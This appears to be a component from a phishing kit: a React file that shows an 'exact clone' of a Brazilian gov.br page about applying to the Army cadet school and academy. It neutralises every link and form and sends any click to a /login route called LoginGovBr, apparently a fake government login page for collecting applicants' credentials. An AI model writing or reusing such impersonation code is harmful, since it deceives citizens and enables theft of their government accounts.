import React, { useRef } from "react";
import { useNavigate } from "react-router-dom";
import { injectMobileCleanup } from "../utils/mobileCleanup";

/**
 * Página inicial — clone exato da página gov.br
 * "Ingressar na Escola Preparatória de Cadetes do Exército ou na
 *  Academia Militar das Agulhas Negras"
 *
 * Comportamento:
 *  - QUALQUER clique dentro da página redireciona para /login (LoginGovBr).
 *  - Todos os links externos (<a href="...">) são neutralizados.
 */
export default function PortalCandidato() {
  const navigate = useNavigate();
  const iframeRef = useRef(null);

  const handleIframeLoad = () => {
    const iframe = iframeRef.current;
    if (!iframe) return;
    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc) return;

    // Esconde acessibilidade lateral + compacta layout em mobile
    injectMobileCleanup(iframe);

    // 1) Neutraliza TODOS os links externos (e internos) — sem navegação própria
    doc.querySelectorAll("a").forEach((a) => {
      a.setAttribute("href", "#");
      a.removeAttribute("target");
      a.style.cursor = "pointer";
    });

    // 2) Neutraliza qualquer <form> para não enviar nada
    doc.querySelectorAll("form").forEach((f) => {
      f.setAttribute("action", "#");
      f.addEventListener("submit", (e) => e.preventDefault());
    });

    // 3) Qualquer clique em qualquer lugar -> /login
    const goLogin = (e) => {
      e.preventDefault();
      e.stopPropagation();
      navigate("/login");
    };
    doc.addEventListener("click", goLogin, true);
    doc.addEventListener("auxclick", goLogin, true);
  };

  return (
    <iframe
      ref={iframeRef}
      title="Portal do Candidato"
      src="/portal-home.html"
      onLoad={handleIframeLoad}
      data-testid="portal-home-iframe"
      style={{
        position: "fixed",
        inset: 0,
        width: "100vw",
        height: "100vh",
        border: "none",
        margin: 0,
        padding: 0,
      }}
    />
  );
}
